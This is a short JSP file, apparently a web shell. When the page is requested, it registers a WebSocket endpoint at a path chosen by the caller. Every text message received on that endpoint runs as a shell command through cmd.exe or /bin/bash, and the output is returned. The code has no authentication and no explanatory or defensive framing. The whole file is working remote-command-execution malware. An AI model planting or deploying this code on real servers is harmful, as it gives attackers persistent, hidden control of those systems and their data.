<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%!
    public static class cmdEndpoint extends Endpoint {
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            session.addMessageHandler(new MessageHandler.Whole<String>() {
                @Override
                public void onMessage(String s) {
                    try {
                        boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
                        Process p;
                        if (isWindows) {
                            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
                        } else {
                            p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
                        }
                        InputStream in = p.getInputStream();
                        int c;
                        StringBuilder all = new StringBuilder();
                        while ((c = in.read()) != -1) {
                            all.append((char)c);
                        }
                        in.close();
                        p.waitFor();
                        session.getBasicRemote().sendText(all.toString());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }
%>
<%
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(cmdEndpoint.class, request.getParameter("path")).build();
    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    try {
        container.addEndpoint(configEndpoint);
    } catch (DeploymentException e) {
        out.println(e.toString());
    }
%>
